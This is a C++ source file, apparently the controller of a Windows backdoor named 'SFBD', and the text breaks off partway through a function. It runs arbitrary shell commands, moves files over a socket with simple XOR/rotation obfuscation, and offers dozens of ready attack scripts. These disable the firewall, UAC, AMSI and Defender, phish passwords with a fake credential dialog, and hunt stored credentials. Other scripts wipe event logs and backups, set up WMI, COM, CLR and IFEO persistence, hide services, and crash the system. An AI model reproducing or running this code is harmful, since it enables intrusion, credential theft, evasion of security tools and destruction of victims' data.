#pragma once
#include "public.h"


class Controller {
public:
    string command(char* cmd) {
        FILE* file;
        char tmp[1024] = { 0 };
        string result = "";

        //排除退出以及空命令
        if (!strcmp(cmd, "exit") | !strcmp(cmd, "quit") | !strcspn(cmd, "\n")) return "";
        //通过管道执行命令并从管道获取命令输出
        else if ((file = _popen(cmd, "r")) != NULL) {
            while (fgets(tmp, 1024, file) != NULL) result = result + tmp;
            _pclose(file);
        }

        //输出为空的判定为出错
        if ((!result.compare("")) | (result.length() == 0)) {
            return "命令执行出错！";
        }
        return result;
    }


    void XOR(uint8_t* dst, const uint8_t* src, size_t src_len, const uint8_t* key, size_t key_len)
    {
        for (size_t i = 0; i < src_len; i++) dst[i] = src[i] ^ key[i % key_len];
    }

    //位移简单加密
    string Rot18(string str, string mode) {
        string map = { "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" };
        string result;
        string key = toAscii(Config::key);

        for (int i = 0; i < str.length(); i++) {
            for (int x = 0; x < map.length(); x++) {
                int extra = key[i % key.length()] - 48;
                if (!mode.compare("encry")) {
                    if (str[i] == map[x]) {
                        if (x > 17) result += map[x - 18 + extra];
                        else result += map[x + 18 + extra];
                    }
                }
                else if (!mode.compare("decry")) {
                    if (str[i] == map[x]) {
                        if (x - extra > 17) result += map[x - 18 - extra];
                        else result += map[x + 18 - extra];
                    }
                }
            }
        }
        return result;
    }

    string toHex(const string& s)
    {
        string result;
        const char* map = "0123456789ABCDEF";

        for (char ch : s)
        {
            int low = ch & 0x0f;
            int high = ((uint8_t)ch) >> 4;
            result += map[high];
            result += map[low];
        }
        return result;
    }

    string HextoStr(const string& s)
    {
        string result;
        const char* map = "0123456789ABCDEF";

        uint8_t* idx = new uint8_t[s.size()];
        for (size_t i = 0; i < s.size(); i++)
        {
            char ch = s[i];
            if (ch >= '0' && ch <= '9')
                idx[i] = ch - '0';
            else if (ch >= 'A' && ch <= 'F')
                idx[i] = ch - 'A' + 10;
        }
        for (size_t i = 0; i < s.size(); i += 2)
        {
            char ch = (idx[i] << 4) | idx[i + 1];
            result += ch;
        }
        delete[] idx;
        return result;
    }

    string toAscii(string& str) {
        string map = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
        string num = "";
        for (int x = 0; x < str.length(); x++) {
            for (int i = 0; i < 94; i++) {
                if (str[x] == map[i]) num += to_string(i + 33);
            }
        }
        return num;
    }


    void readfile(SOCKET* sock, string filename, int size , bool output) {
        string temp;
        int count = 1;
        fstream file(filename, ios::in | ios::binary);

        //逐个读取，达到一定大小停止
        while (!file.eof()) {
            temp += file.get();
            if (count == size) {
                Sleep(5);
                send_rottext(sock, temp);
                temp = "";
                count = 0;
                if (output) cout << ".";
            }
            count++;
        }
        //发送结尾部分
        Sleep(2000);
        send_rottext(sock, temp);
        //告知文件传输结束
        Sleep(1000);
        send_rottext(sock, "##end##");
        file.close();
    }

    void writefile(SOCKET* sock, string filename,int size, bool output) {
        string temp;
        int bufsize = size * 2;
        char* text_buf = new char[bufsize];
        fstream file(filename, ios::out | ios::binary);

        while (true) {
            //清空缓冲区
            memset(text_buf, 0, bufsize);
            temp = recv_rottext(sock, text_buf, bufsize);
            if (!temp.compare("##end##")) break;
            file << temp;
            if (output) cout << ".";
        }
        file.close();
        delete[] text_buf;
    }

    string download_file(string args,SOCKET* sock,bool output = false) {
        string filename = text_substr(args, " ", 3);
        if (text_substr_count(args) <= 2) {
            string message = "\n参数：\n[download/upload FromFileName ToFileName] <SegmentSize>\n\n";
            message += "可以自定义分段大小（字节，默认2000）调节发送频次\n\n";
            return message;
        }
        else if (text_substr_count(args) == 4) {
            writefile(sock, filename, atoi(text_substr(args).data()),output);
        }
        else writefile(sock, filename, 2000,output);
        return "\n下载完成...\n";
    }

    string upload_file(string args, SOCKET* sock,bool output=false) {
        string filename = text_substr(args, " ", 2);
        if (text_substr_count(args) <= 2) {
            string message = "\n参数：\n[download/upload FromFileName ToFileName] <SegmentSize>\n\n";
            message += "可以自定义分段大小（字节，默认2000）调节发送频次\n\n";
            return message;
        }
        else if (!FILEorDIR(filename).compare("error")) return "文件不存在";
        else if (text_substr_count(args) == 4) {
            readfile(sock, filename, atoi(text_substr(args, " ").data()),output);
        }
        else readfile(sock, filename, 2000,output);
        return "\n上传完成...\n";
    }


    //自定义命令及作用域
    string DIYcmd(string cmd){
        string result;
        string SFcmd = text_substr(cmd,"::",1);
        cmd = cmd.substr(cmd.find("::")+2);

        if (!SFcmd.compare("SFBD")) result = Global_Help();
        else if (!SFcmd.compare("cmds")) result = cmd_script(cmd);
        else if (!SFcmd.compare("func")) result = cmd_func(cmd);

        return result;
    }
    string Global_Help() {
        string message = "";
        message += "\n作用域：\nSFBD\t\t全局命令";
        message += "\ncmds\t\t内置的一些命令脚本\n";
        message += "func\t\t程序的主要功能区\n\n";
        message += "通过[作用域名]::[命令] 使用，例如SFBD::help\n\n\n";
        message += "cd [DirName]\t用于目录穿越\n";
        message += "download [FromFileName] [ToFileName] <SegmentSize> \t用于下载文件，可自定义分段传输大小\n";
        message += "upload [FromFileName] [ToFileName] <SegmentSize> \t用于上传文件，可自定义分段传输大小\n";
        message += "quit/exit\t用于退出终端\n";
        message += "close\t\t用于关闭服务端\n";
        message += "以上命令不需要加作用域\n\n\n";
        message += "注意事项：\n\t1.该程序不能执行交互式命令\n\n";
        return message;
    }

    //内置一些命令脚本方便使用
    string cmd_script(string SFcmd) {
        string message;
        string cmd = text_substr(SFcmd, " ", 1);
        string script;

        //传递的参数
        int args_h = 0;
        string args_f;
        string args_t;
        string args_m;
        string args_d;
        int argc = text_substr_count(SFcmd," ");

        for (int i = 2; i <= argc; i++) {
            string arg = text_substr(SFcmd, " ", i);
            if (!arg.compare("-h")) args_h = 1;
            if (!arg.compare("-f")) args_f = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-t")) args_t = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-m")) args_m = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-d")) args_d = text_substr(SFcmd, " ", i + 1);
        }

        if (!cmd.compare("help")) {
            message = "\ncmds作用域 -- 内置命令列表：\n";
            message += "\thelp\t\t\t\t列出所有内置命令及说明\n";
            message += "\tlistkb\t\t\t\t列出系统上已安装的补丁\n";
            message += "\tdownload\t\t\tcertutil命令下载文件\n";
            message += "\tdormancy\t\t\t设置电脑休眠\n";
            message += "\tlock_screen\t\t\t锁定屏幕\n";
            message += "\tzip\t\t\t\tZIP压缩\n";
            message += "\tscreenshot\t\t\t屏幕截图\n";
            message += "\tdisable_firewall\t\t关闭防火墙\n";
            message += "\tenable_firewall\t\t\t开启防火墙\n";
            message += "\tdisable_network\t\t\t禁用默认网络适配器\n";
            message += "\tenable_network\t\t\t启用默认网络适配器\n";
            message += "\tdisable_uac\t\t\t关闭UAC（将弹出通知），重启生效\n";
            message += "\tenable_uac\t\t\t开启UAC\n";
            message += "\tenable_rdp\t\t\t开启远程桌面\n";
            message += "\tdisable_rdp\t\t\t关闭远程桌面\n";
            message += "\tdisable_fail_rec\t\t禁用windows故障恢复（管理员权限）\n";
            message += "\tenable_fail_rec\t\t\t启用windows故障恢复（管理员权限）\n";
            message += "\tdisable_AMSI\t\t\t禁用AMSI（使其初始化失败）\n";
            message += "\tenable_AMSI\t\t\t启用AMSI\n";
            message += "\tdisable_defender\t\t废除Windows默认杀软（不禁用，但使其不会再定义病毒）\n";
            message += "\tset_defender\t\t\t设置Windows默认杀软的排除项\n";
            message += "\tlocation\t\t\t获取当前位置的经纬度\n";
            message += "\tlistav\t\t\t\t列出电脑上已安装的反病毒程序\n";
            message += "\tprompt_auth\t\t\t无限弹出账户验证弹窗直到用户输入正确密码\n";
            message += "\twifi_password\t\t\t获取计算机上保存的WiFi凭据\n";
            message += "\tcheck_msi\t\t\t.msi安装程序提权检查（HKCU/HKLM，0x1为启用）\n";
            message += "\tcheck_reg_pri\t\t\t检查不安全的注册表权限（获取可以修改的服务二进制文件，将生成%temp%\perm.txt）\n";
            message += "\tcheck_dir_pri\t\t\t检查不安全的文件夹权限\n";
            message += "\tcheck_path_quotes\t\t检查没带引号的服务可执行程序路径\n";
            message += "\tcheck_file_password\t\t检查一些程序是否在磁盘留下凭据\n";
            message += "\tcheck_reg_password\t\t检查一些程序是否在注册表留下凭据\n";
            message += "\tcopy_any_file\t\t\t复制任意文件（管理员权限）\n";
            message += "\trdp_log\t\t\t\t查询远程桌面连接日志\n";
            message += "\tclear_rdp_log\t\t\t清除远程桌面日志痕迹\n";
            message += "\tdisable_office_pro\t\t禁用office安全功能（不显示任何警告）\n";
            message += "\tenable_pth\t\t\t允许所有管理员进行哈希传递\n";
            message += "\tdisable_pth\t\t\t禁止RID500以外管理员进行哈希传递\n";
            message += "\twindows\t\t\t\t获取系统当前的活动窗口列表\n";
            message += "\tget_clip\t\t\t获取剪贴板内容\n";
            message += "\tset_clip\t\t\t设置剪贴板内容\n";
            message += "\tprocess\t\t\t\t列出正在运行的进程和服务\n";
            message += "\tservices\t\t\t列出系统上的服务列表\n";
            message += "\tinstalled\t\t\t列出系统上已安装的程序（Program Files文件夹）\n";
            message += "\ti30\t\t\t\t磁盘损坏漏洞（版本>1803）\n";
            message += "\tdelete_bak\t\t\t删除windows系统上的一些备份文件\n";
            message += "\tiehistory\t\t\t查询IE浏览记录\n";
            message += "\tclear_log\t\t\t遍历删除所有类别的日志\n";
            message += "\tnetlm\t\t\t\t启用NetNTLM降级\n";
            message += "\tenable_crash_dump\t\t开启系统崩溃的完全内存转储\n";
            message += "\tdisable_crash_dump\t\t禁用系统的崩溃内存转储\n";
            message += "\tenable_wdigest\t\t\t启用WDigest UseLogonCredential\n";
            message += "\tdisable_wdigest\t\t\t禁用WDigest UseLogonCredential\n";
            message += "\tIFEO\t\t\t\t设置映像劫持（退出时触发）\n";
            message += "\thijack\t\t\t\t劫持一些windows内置程序以维持权限\n";
            message += "\twmi\t\t\t\tWMI事件-权限维持\n";
            message += "\tdelwmi\t\t\t\t删除注册的WMI事件\n";
            message += "\tcom\t\t\t\tCOM劫持-权限维持\n";
            message += "\treccom\t\t\t\tCOM劫持恢复默认值\n";
            message += "\tclr\t\t\t\tCLR劫持-权限维持\n";
            message += "\thidden_services\t\t\t通过SDDL隐藏服务\n";
            message += "\tdisplay_services\t\t通过SDDL取消隐藏服务\n";
            message += "\tcrash\t\t\t\t让系统蓝屏（管理员权限）\n";
            message += "\tfork\t\t\t\t让电脑卡死\n";
            message += "\tfork2\t\t\t\t让电脑卡死\n";
            message += "\tpopup\t\t\t\t无限弹窗（cmd窗口）\n";
            message += "\n部分命令可以通过 -h 参数获取进一步的帮助\n\n";
            return message;
        }
        //构造各种命令脚本
        else if (!cmd.compare("listkb")) script = "systeminfo|findstr KB";
        else if (!cmd.compare("crash")) script = "taskkill /IM svchost.exe";
        else if (!cmd.compare("disable_firewall")) script = "NetSh Advfirewall set allprofiles state off";
        else if (!cmd.compare("enable_firewall")) script = "NetSh Advfirewall set allprofiles state on";
        else if (!cmd.compare("disable_network")) script = "netsh interface set interface \"以太网\" disabled";
        else if (!cmd.compare("enable_network")) script = "netsh interface set interface \"以太网\" enable";
        else if (!cmd.compare("check_path_quotes")) script = "wmic service get name,displayname,pathname,startmode|findstr \"Auto\"|findstr /V /I \"c:\windows\" |findstr /I /V \"\"\"";
        else if (!cmd.compare("listav")) script = "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more";
        else if (!cmd.compare("disable_defender")) script = "\"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true";
        else if (!cmd.compare("enable_pth")) script = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f 2>&1";
        else if (!cmd.compare("disable_pth")) script = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f 2>&1";
        else if (!cmd.compare("disable_uac")) script = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f 2>&1";
        else if (!cmd.compare("enable_uac")) script = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f 2>&1";
        else if (!cmd.compare("windows")) script = "powershell -Command \"get-process | where-object {$_.mainwindowhandle -ne 0} | select-object name, mainwindowtitle\"";
        else if (!cmd.compare("get_clip")) script = "powershell -Command \"Get-Clipboard\"";
        else if (!cmd.compare("process")) script = "tasklist /svc";
        else if (!cmd.compare("services")) script = "sc query";
        else if (!cmd.compare("installed")) script = "powershell -Command \"Get-ChildItem \'C:\Program Files\', \'C:\Program Files (x86)\' | ft Parent,Name,LastWriteTime\"";
        else if (!cmd.compare("rdp_log")) script = "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" 2>&1";
        //这个命令被火绒报毒，加引号简单混淆已绕过
        else if (!cmd.compare("disable_fail_rec")) script = "bcdedit.exe /set {default} bootstatuspolicy igno\"\"reallfail\"\"ures & bcdedit.exe /set {default} recove\"\"ryenab\"\"led no";
        else if (!cmd.compare("enable_fail_rec")) script = "bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures & bcdedit.exe /set {default} recoveryenabled yes";
        else if (!cmd.compare("i30")) script = "cd C:\\:$i30:$bitmap";
        else if (!cmd.compare("iehistory")) script = "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TypedURLs\"";
        else if (!cmd.compare("clear_log")) script = "for /F \"tokens=*\" %a in ('wevtutil.exe el') DO wevtutil.exe cl \"%a\"";
        else if (!cmd.compare("enable_rdp")) script = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1";
        else if (!cmd.compare("disable_rdp")) script = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f 2>&1";
        else if (!cmd.compare("netlm")) script = "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f 2>&1";
        else if (!cmd.compare("enable_crash_dump")) script = "reg add hklm\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 1 /f 2>&1";
        else if (!cmd.compare("disable_crash_dump")) script = "reg add hklm\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 0 /f 2>&1";
        else if (!cmd.compare("enable_wdigest")) script = "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f  2>&1";
        else if (!cmd.compare("disable_wdigest")) script = "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f  2>&1";
        else if (!cmd.compare("dormancy")) script = "rundll32.exe powrprof.dll,SetSuspendState";
        else if (!cmd.compare("lock_screen")) script = "RunDll32.exe user32.dll,LockWorkStation ";
        else if (!cmd.compare("fork")) {
            script = "cmd /c @cd /d %temp% & echo @start /min cmd ^& cmd > cmd.bat & cmd";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("fork2")) {
            script = "echo %0^|%0 > 1.bat & 1.bat";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("popup")) {
            script = "echo :start > 1.bat&echo start cmd >>1.bat&echo goto start >>1.bat &1.bat";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("disable_AMSI")) {
            script = "powershell -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)\"";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("enable_AMSI")) {
            script = "powershell -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $false)\"";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("location")) { 
            script = "powershell -Command \"Add-Type -AssemblyName System.Device; ";
            script += "$GeoWatcher=New-Object System.Device.Location.GeoCoordinateWatcher;$GeoWatcher.Start();";
            script += "Start-Sleep -Milliseconds 100;$GeoWatcher.Position.Location | Select Latitude,Longitude\"";
        }
        else if (!cmd.compare("check_msi")) {
            script = "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>&1 & ";
            script += "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>&1";
        }
        else if (!cmd.compare("check_reg_pri")) {
            script = "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> %temp%\perm.txt";
            this->command((char*)script.data());
            script = "for /f eol^=^\"^ delims^=^\" %a in (%temp%\perm.txt) do cmd.exe /c icacls \"%a\" 2>nul | findstr \"(M) (F) :\\\"";
            message = this->command((char*)script.data());
            return message;
        }
        else if (!cmd.compare("check_dir_pri")) {
            script = "icacls \"C:\\Program Files\\*\" 2>nul | findstr \"(F) (M) :\\\" | findstr \":\\ everyone authenticated users todos %username%\"&";
            script += "icacls \"C:\\Program Files (x86)\\*\" 2>nul | findstr \"(F) (M) C:\\\" | findstr \":\\ everyone authenticated users todos %username%\"";
        }
        else if (!cmd.compare("check_file_password")) {
            script = "dir C:\\unattend.xml &dir C:\\sysprep.inf &dir C:\\sysprep\\sysprep.xml & ";
            script += "dir %WINDIR%\\Panther\\Unattend\\Unattended.xml &dir %WINDIR%\\Panther\\Unattended.xml &dir C:\\Windows\\Panther\\Unattend\\Unattend.xml & ";
            script += "dir C:\\Windows\\system32\\sysprep.inf &dir C:\\Windows\\system32\\sysprep\\sysprep.xml &dir C:\\Windows\\Panther\\Unattend.xml & ";
            script += "dir C:\\Windows\\Panther\\Unattended.xml &dir C:\\Windows\\Panther\\Unattend\\Unattended.xml &dir C:\\Windows\\System32\\Sysprep\\unattend.xml & ";
            script += "dir C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml &dir C:\\inetpub\\wwwroot\\web.config &dir C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Credentials &";
            script += "dir \"%AllUsersProfile%Application Data\\McAfee\\Common Framework\\SiteList.xml\" &dir %userprofile%\\Documents\\NetSarang\\Xshell\\Sessions &";
            script += "dir \"%userprofile%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions\" &dir C:\\Users\\%username%\\AppData\\Roaming\\VanDyke\\Config\\Sessions &";
        }
        else if (!cmd.compare("check_reg_password")) {
            script = "reg query HKCU\\Software\\ORL\\WinVNC3\\Password&";
            script += "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"&";
            script += "reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"&";
            script += "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" &";
            script += "reg query HKEY_CURRENT_USER\\Software\\OpenSSH\\Agent\\Keys &";
            script += "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 &";
            script += "reg query \"HKEY_CURRENT_USER\\Software\\TightVNC\\Server Value\" &";
            script += "reg query HKCU\\Software\\TigerVNC\\WinVNC4 &";
            script += "reg query HKEY_CURRENT_USER\\Software\\PremiumSoft &";
            script += "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\"";
            if (!this->command((char*)script.data()).compare("")) return "搜索完毕，无结果";
        }
        else if (!cmd.compare("copy_any_file")) {
            if ((!args_f.compare("")) || (!args_t.compare(""))) args_h = 1;
            if (args_h) return "\n参数：\n-f 指定要复制的文件位置\n-t 指定要复制到哪个位置\n";
            script = "esentutl.exe /y /vss "+args_f+" /d "+args_t;
        }
        //清理rdp的注册表缓存、default.rdp文件、位图缓存
        else if (!cmd.compare("clear_rdp_log")) {
            script = "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f 2>&1 &";
            script += "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /va /f 2>&1 &";
            script += "del %userprofile%\documents\Default.rdp &";
            script += "del \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\*\"";
        }
        else if (!cmd.compare("disable_office_pro")) {
            script = "powershell -Command \"New-Item -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\';";
            script += "New-Item -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\';";
            script += "New-Item -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\';";
            script += "New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\' -Name \'VBAWarnings\' -Value \'1\' -PropertyType \'Dword\';";
            script += "New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\' -Name \'DisableInternetFilesInPV\' -Value \'1\' -PropertyType \'Dword\'";
            script += "New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\' -Name \'DisableUnsafeLocationsInPV\' -Value \'1\' -PropertyType \'Dword\'";
            script += "New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\' -Name \'DisableAttachementsInPV\' -Value \'1\' -PropertyType \'Dword\'\"";
        }
        else if (!cmd.compare("screenshot")) {
            if (!args_f.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-f 指定保存截图文件名或路径（bmp文件格式）\n";
            script = "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms;";
            script += "Add-type -AssemblyName System.Drawing;";
            script += "$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;";
            script += "$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height;";
            script += "$graphic = [System.Drawing.Graphics]::FromImage($bitmap);";
            script += "$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size);";
            script += "$bitmap.Save('"+args_f+"')";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("set_clip")) {
            if (!args_t.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-t 指定要放入剪贴板的文本\n";
            script = "echo "+args_t+" | clip";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("delete_bak")) {
            script = "vssadmin.exe delete shadows /all /quiet&";
            script += "wbadmin.exe delete catalog -quiet&";
            script += "del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("download")) {
            if ((!args_f.compare("")) || (!args_t.compare(""))) args_h = 1;
            if (args_h) return "\n参数：\n-f 指定要下载的文件url\n-t 指定要保存到哪个位置\n";
            script = "certutil.exe -urlcache -split -f \""+args_f+"\" "+args_t;
        }
        //究极转义
        //第一次检测凭据是否有效会等待很久，微软的锅
        else if (!cmd.compare("prompt_auth")) {
            script = "powershell -Command \"Add-Type -assemblyname system.DirectoryServices.accountmanagement;";
            script += "$Cred = $host.ui.PromptForCredential(\\\"Microsoft Windows 凭据管理器\\\", \\\"当前凭据已过期，请重新验证\\\", $(whoami).Split(\\\"\\\\\\\")[1], $(whoami).Split(\\\"\\\\\\\")[0]);";
            script += "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine,$(whoami).Split(\\\"\\\\\\\")[0]);";
            script += "while (1){ try{ if ($DS.ValidateCredentials($Cred.username.Split(\\\"\\\\\\\")[1], $Cred.GetNetworkCredential().password)) { break; } ";
            script += "else { $Cred = $host.ui.PromptForCredential(\\\"Microsoft Windows 凭据管理器\\\", \\\"请输入有效凭据\\\", $(whoami).Split(\\\"\\\\\\\")[1], $(whoami).Split(\\\"\\\\\\\")[0]); }} ";
            script += "catch { $Cred = $host.ui.PromptForCredential(\\\"Microsoft Windows 凭据管理器\\\", \\\"请输入有效凭据\\\", $(whoami).Split(\\\"\\\\\\\")[1], $(whoami).Split(\\\"\\\\\\\")[0]); }} ";
            script += "$user = $Cred.username;$pass = $Cred.GetNetworkCredential().password;echo \\\"捕获凭据！===用户名：$user 密码：$pass===\\\"\"";
        }
        else if (!cmd.compare("IFEO")) {
            if ((!args_f.compare("")) || (!args_t.compare(""))) args_h = 1;
            if (args_h) return "\n参数：\n-t 指定要劫持的目标程序名\n-f 指定目标程序退出时执行的程序（绝对路径）\n注意：该操作会引起火绒的警告\n";
            script = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+args_t+"\" /v GlobalFlag /t REG_DWORD /d 512 /f &";
            script += "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"+args_t+"\" /v ReportingMode /t REG_DWORD /d 1 /f &";
            script += "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"+args_t+"\" /v MonitorProcess /t REG_SZ /d \""+args_f+"\" /f &";
        }
        else if (!cmd.compare("zip")) {
            if ((!args_f.compare("")) || (!args_t.compare(""))) args_h = 1;
            if (args_h) return "\n参数：\n-f 指定要压缩的文件\n-t 指定要生成的目标zip文件名\n";
            script = "powershell -Command \"dir '"+args_f+"' -Recurse | Compress-Archive -DestinationPath '"+args_t+"'\"";
            if (this->command((char*)script.data()).compare("")) return "执行完毕";
        }
        else if (!cmd.compare("wmi")) {
            if (!args_f.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-f 指定要执行的程序\n\n注意：将在开机60秒内执行，仅维持一小段时间\n";
            script = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"SFBD\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"&";
            script += "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"SFBD\", ExecutablePath=\""+args_f+"\",CommandLineTemplate=\""+args_f+"\"&";
            script += "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"SFBD\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"SFBD\\\"\"";
        }
        else if (!cmd.compare("delwmi")) {
            script = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"SFBD\" DELETE &";
            script += "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"SFBD\" DELETE &";
            script += "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE Filter=\"__EventFilter.Name='SFBD'\" DELETE &";
        }
        else if (!cmd.compare("clr")) {
            if (!args_d.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-d 指定要加载执行的dll\n";
            script = "reg add HKCU\\Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111} /t REG_EXPAND_SZ /d \""+args_d+"\" /f 2>&1 &";
            script += "reg add HKCU\\Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111} /v ThreadingModel /t REG_SZ /d Apartment /f 2>&1 &";
            script += "SETX COR_ENABLE_PROFILING= 1 /M &";
            script += "SETX COR_PROFILER= {11111111-1111-1111-1111-111111111111} /M";
        }
        else if (!cmd.compare("hidden_services")) {
            if (!args_t.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-t 指定要隐藏的目标服务名\n";
            script = "powershell -Command \"& $env:SystemRoot\\System32\\sc.exe sdset "+args_t+" \\\"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\\\"\" 2>&1";
        }
        else if (!cmd.compare("display_services")) {
            if (!args_t.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-t 指定要取消隐藏的目标服务名\n";
            script = "powershell -Command \"& $env:SystemRoot\\System32\\sc.exe sdset "+args_t+" \\\"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\\\" 2>&1\"";
        }
        else if (!cmd.compare("set_defender")) {
